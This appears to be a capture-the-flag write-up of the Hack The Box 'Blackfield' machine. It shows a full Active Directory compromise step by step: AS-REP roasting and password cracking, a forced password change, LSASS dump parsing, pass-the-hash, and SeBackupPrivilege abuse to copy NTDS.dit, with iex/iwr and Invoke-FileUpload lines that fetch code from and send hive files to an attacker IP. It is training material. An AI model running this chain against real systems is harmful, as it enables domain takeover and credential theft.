---
layout: post
title: "Blackfield"
date: 2025-04-20 
categories: CTPS Playlist
---
# Attack Path

First enumerate the open ports and scan the services

```bash
rustscan -a 10.129.252.166

#save the output to ports.txt and use extract_ports.sh to get ports

sudo nmap -p53,88,135,389,445,593,3268,5985 -sC -sV -oA nmap/blackfield 10.129.252.166

result:
PORT     STATE SERVICE       VERSION                                                                                               
53/tcp   open  domain        Simple DNS Plus                                                                                       
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-11-29 23:21:53Z)                                        
135/tcp  open  msrpc         Microsoft Windows RPC                                                                                 
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)   
445/tcp  open  microsoft-ds?                                                                                                       
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0                                                                   
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)   
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)                                                               
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
```

Also we the domain name BLACKFIELD.local so let’s add BLACKFIELD.local and BLACKFIELD in /etc/hosts.

Let’s also try null authentication to RPC port. We are in so let’s try to enumerate for domain users

```bash
rpcclient 10.129.252.166 -U ''

enumdomusers

#Unfortunately we do not have permission
```

Let’ try the smb share next:

```bash
smbclient -N -L //10.129.252.166

result:
Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        forensic        Disk      Forensic / Audit share.
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        profiles$       Disk      
        SYSVOL          Disk      Logon server share
```

The profiles$ share holds user information, let’s enumerate that and get a list of usernames that we can kerbrute with. Let’s first try and mount the directory on our host for easier and quicker enumeration

```bash
sudo mount -t cifs '//10.129.252.166/profiles$' /mnt

#navigate to the /mnt dir to view the users. Now let's see if there are any files in the directories and at the same time make a users list; in the /mnt dir:

find .  #list and try and find any files within the users' dir
ls > ~/htb_lab/blackfield/users.txt
```

Now back in our attacking dir, let’s start kerbrute

```bash
../tools/kerbrute userenum --dc 10.129.252.166 -d blackfield users.txt -o kerbrute_users.out

result:
2024/11/29 16:53:22 >  [+] VALID USERNAME:       svc_backup@blackfield                                                                                    
2024/11/29 16:53:22 >  [+] VALID USERNAME:       audit2020@blackfield                                                                                     
2024/11/29 16:53:22 >  [+] VALID USERNAME:       support@blackfield
```

Now make a users list with just the username without the @blackfield
With a list of valid users, we can use [GetNPUsers.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py) from the Impacket toolkit to hunt for all users with Kerberos pre-authentication not required.

```bash
/usr/share/doc/python3-impacket/examples/GetNPUsers.py blackfield/ -dc-ip 10.129.252.166 -no-pass -usersfile users.lst

#And we get a result for a TGT ticket hash that we can attempt to crack with hashcat for user support. Save the hash to a file.
```

We crack the hash on host machine because it’s quicker

```bash
hashcat.exe -m 18200 wordlists\support_hash.txt wordlists\rockyou.txt

hashcat.exe -m 18200 wordlists\support_hash.txt --show

result:
$krb5asrep$23$support@BLACKFIELD:9595d8b66ce355129104497aa702aa9d$7cc27f70ba1100b2b2a592fe8a79b2c10b3f07152172ef04510d940e1febf3c4c5                                                                                                           55f57657ca9676a56d57da1cad8a2f152c67852f24ede584a7faf1e3e76c7b53751b841789fcc51002d90b457dcba1f7e4ad23b3a66b2fc321fa4d18bb0773fcbfb1f                                                                                                           f6ada09ad265ea32aeeafe9343f9fdbb582ef9d33911fffd156142f4b9e3e4a8abf401a5ffba29693c6175ddfccd241465ad02ca5eebc81d84e82f4b34b394b6a472c                                                                                                           c18ebedd761e9189df6d12ce907d833a507d19691931f02bf203cd40402fbd9d02ab930237193208bc2187241c04a4d8b282bec6924cc1a66c52765b72c789186d76c                                                                                                           c1203d8f409de2b:#00^BlackKnight
```

We have cracked the hash

Now let’s test if the password works and attempt to login on the smbshare

```bash
crackmapexec smb 10.129.252.166 -u support -p '#00^BlackKnight' 

#The password is correct. 
```

Now let’s go back to rpc port and do enumdomusers to get a full list of usernames

```bash
rpcclient -U support 10.129.252.166

```

Create a tmp file for it and filter only the username

```bash
cat tmp | awk -F '\[' '{print $2}' | awk -F '\]' '{print $1}' > valid_users.lst
```

Now we do GetNPUsers again

```bash
/usr/share/doc/python3-impacket/examples/GetNPUsers.py blackfield/ -dc-ip 10.129.252.166 -no-pass -usersfile valid_users.lst 
```

No other users ticket hash was found. Let’s try and map the network out with bloodhound

```bash
mkdir bloodhound_output
bloodhound-python -u support -p '#00^BlackKnight' -ns 10.129.252.166 -d blackfield.local -c all

#Then once it's finished running, start bloodhound and click and drage all files to bloodhound

bloodhound
```

Then drag all the json files to the bloodhound interface (just anywhere)

And we search for the user we have compromised (support) and set it as our starting node. Now we go through the node info and we see there is something under First Degree Object Control. We have ForceChangePassword rights over the user audit2020. Right-click on the line connecting the two users and click on Linux Abuse to get the instruction for the exploit

```bash
net rpc password "audit2020" "newP@ssword2022" -U "BLACKFIELD"/"support"%"#00^BlackKnight" -S "10.129.252.166"
```

Let’s once again enumerate the smb shares with our new user

```bash
crackmapexec smb 10.129.252.166 -u "audit2020" -p "newP@ssword2022" --shares

result:
SMB         10.129.252.166  445    DC01             Share           Permissions     Remark
SMB         10.129.252.166  445    DC01             -----           -----------     ------
SMB         10.129.252.166  445    DC01             ADMIN$                          Remote Admin
SMB         10.129.252.166  445    DC01             C$                              Default share
SMB         10.129.252.166  445    DC01             forensic        READ            Forensic / Audit share.
SMB         10.129.252.166  445    DC01             IPC$            READ            Remote IPC
SMB         10.129.252.166  445    DC01             NETLOGON        READ            Logon server share 
SMB         10.129.252.166  445    DC01             profiles$       READ            
SMB         10.129.252.166  445    DC01             SYSVOL          READ            Logon server share
```

We have read permission on forensic share. Let’s once again mount the share on our host and read what’s in the forensic share

```bash
sudo mount -t cifs -o 'username=audit2020,password=newP@ssword2022' //10.129.252.166/forensic /mnt

cd /mnt
cd /commands_output/domain_admins.txt

result:
Members

-------------------------------------------------------------------------------
Administrator       Ipwn3dYourCompany

cat tasklist.txt #looking for firefox, maybe we can steal cookies, firefox not found.

cd ../memory_analysis
ls
#One file that stood out is lsass.zip, LSASS (Local Security Authority Subsystem Service) is a Windows process responsible for enforcing security policies and storing user credentials in memory, making it a key target for attackers seeking to extract passwords or hashes for lateral movement. Let's copy that into our working dir

cp lsass.zip ~/htb_lab/blackfield
```

Now we can use pypykatz to dump user password hashes

```bash
pypykatz lsa minidump lsass.DMP

grep NT lsass.out -B3 | grep -i username

#and we use less to find the NT hashes

less lsass.out  #use / then type what you want to find e.g. /Administrator
```

We have the NT hashes for svc_backup and administrator. We can use CME with this and see if the hash works

```bash
crackmapexec smb 10.129.252.166 -u Administrator -H 7f1e4ff8c6a8e6b6fcae2d9c0572cd62  #it fails

crackmapexec smb 10.129.252.166 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d #it works, let's see if winrm also works

crackmapexec winrm 10.129.252.166 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d #it works
```

Now let’s winrm in:

```bash
evil-winrm -i 10.129.252.166 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d 

*Evil-WinRM* PS C:\Users\svc_backup\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled

#can also do whoami /all, shows us we are in backup operators as well
```

As backup operators, we have permission to copy sensitive files such as SAM, SYSTEM and NTDS.dit. Let’s visit [https://github.com/giuliano108/SeBackupPrivilege?tab=readme-ov-file](https://github.com/giuliano108/SeBackupPrivilege?tab=readme-ov-file) to download the exploit DLLs.

This group also permits logging in locally to a domain controller. The active directory database `NTDS.dit`
 is a very attractive target, as it contains the NTLM hashes for all 
user and computer objects in the domain. However, this file is locked 
and is also not accessible by unprivileged users.

As the `NTDS.dit` file is locked by default, we can use the Windows [diskshadow](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow) utility to create a shadow copy of the `C` drive and expose it as `E` drive. The NTDS.dit in this shadow copy won't be in use by the system. First we have to create a script called script.txt that includes

```bash
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
set context persistent
begin backup
add volume C: alias cdrive
create
expose %cdrive% E:
end backup
exit

```

Now grab the file from python server and execute the following

```bash
iwr http://10.10.14.118:1234/script.txt -OutFile script.txt
iwr http://10.10.14.118:1234/SeBackupPrivilegeCmdLets.dll -OutFile SeBackupPrivilegeCmdLets.dll
iwr http://10.10.14.118:1234/SeBackupPrivilegeUtils.dll -OutFile SeBackupPrivilegeUtils.dll

diskshadow /s script.txt
```

For some reason, the file transferred don’t work, we can add file manually like this

```bash
Set-Content -Path script.txt -Value "SET METADATA C:\Windows\Temp\meta.cab"
Add-Content -Path script.txt -Value "set context clientaccessible"
Add-Content -Path script.txt -Value "set context persistent"
Add-Content -Path script.txt -Value "begin backup"
Add-Content -Path script.txt -Value "add volume C: alias cdrive"
Add-Content -Path script.txt -Value "create"
Add-Content -Path script.txt -Value "expose %cdrive% E:"
Add-Content -Path script.txt -Value "end backup"
Add-Content -Path script.txt -Value "exit"

diskshadow /s script.txt

dir E:
```

Now it works and the E drive exists.

```bash
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll

Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Users\svc_backup\Desktop\ntds.dit

reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
```

Now we have all the files we need, we need to upload the files back to our attack host. To do that, we need to use PSUpload.ps1. First transfer the ps file to the target with iwr. Then:

```bash
Import-Module PSUpload.ps1

iex (iwr 'http://10.10.14.118:1234/PSUpload.ps1')  #we have to load the following in memory

#now we have to start a server
python3 -m venv myenv
source myenv/bin/activate
pip3 install uploadserver
python3 -m uploadserver 1234

Invoke-FileUpload -Uri http://10.10.14.118:1234/upload -File C:\Users\svc_backup\Desktop\SAM.SAV

Invoke-FileUpload -Uri http://10.10.14.118:1234/upload -File C:\Users\svc_backup\Desktop\SYSTEM.SAV

Invoke-FileUpload -Uri http://10.10.14.118:1234/upload -File C:\Users\svc_backup\Desktop\ntds.dit
```

Now we can dump the hashes back on our attack host

```bash
../tools/secretsdump.py -ntds ntds.dit -system SYSTEM.SAV -sam SAM.SAV LOCAL > nt-hashes.txt
```

Now we open the hash file and search for Administrator, there’s two hashes, one from SAM which is the local admin hash and one is the domain admin from ntds.dit; we want the latter. Now we can just login again with evil-winrm

```bash
evil-winrm -i 10.129.252.166 -u Administrator -H 184fb5e5178480be64824d4cd53b99ee
```

- logged in null smb share for userlist in profiles$
- kerbrute userlist to find valid users
- [GetNPUsers.py](http://GetNPUsers.py) to grab TGT hash
- hashcat crack password
- bloodhound to find user rights + exploit
- exploited SeBackupPrivilege with diskshadow
- file exfiltration with PSUpload.ps1 and uploadserver
- secretsdump to dump NThash
- login with evil-winrm pass-the-hash